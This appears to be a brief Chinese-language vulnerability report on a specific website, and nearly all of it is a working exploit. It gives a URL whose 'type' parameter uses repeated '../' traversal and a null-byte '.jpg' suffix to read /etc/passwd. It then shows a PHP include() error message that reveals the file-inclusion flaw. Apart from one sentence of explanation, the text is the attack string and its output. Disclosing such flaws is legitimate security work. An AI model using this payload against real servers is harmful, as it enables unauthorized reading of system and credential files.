http://xshow.pipi.cn/index.php?r=user/openLogin&type=../../../../../../../../../../etc/passwd%00.jpg
为什么说是任意文件读取呢？提交一个单引号让他报错：
操作出错啦--include(../../../../../../../../../../etc/passwd') [function.include]: failed to open stream: No such file or directory返回前页
